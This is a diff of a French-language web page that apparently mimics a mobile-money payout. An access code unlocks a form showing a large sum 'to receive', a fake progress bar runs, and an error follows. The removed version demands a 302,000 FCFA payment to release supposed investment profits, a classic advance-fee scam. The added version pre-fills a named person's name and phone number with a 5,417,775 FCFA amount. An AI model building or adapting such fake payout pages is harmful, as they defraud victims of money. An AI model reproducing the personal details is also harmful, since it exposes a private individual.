@@ -133,22 +133,22 @@
     </div>
 
     <div class="form-container" id="formContainer" style="display: none;">
-        <h1>Bénéfices d'investissement Candrone</h1>
+        <h1>Paiement TMoney</h1>
 
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" placeholder="Nom et Prénom" required>
+                <input type="text" id="name" value="ADOM Aklesso" disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro Mobile</label>
-                <input type="tel" id="phone" placeholder="Numéro" required>
+                <input type="tel" id="phone" value="90298629" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="1 852 000 FCFA" disabled>
+                <input type="text" id="amount" class="amount" value="5 417 775 FCFA" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -160,7 +160,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Vous devez terminer votre paiement de 302.000 FCFA pour finaliser le transfert des fonds. Merci</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Le compte n'est pas éligible pour recevoir la somme de 5 417 775 FCFA.</div>
         </form>
     </div>
 
@@ -169,7 +169,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "2024") {
+            if (accessCode === "1795") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
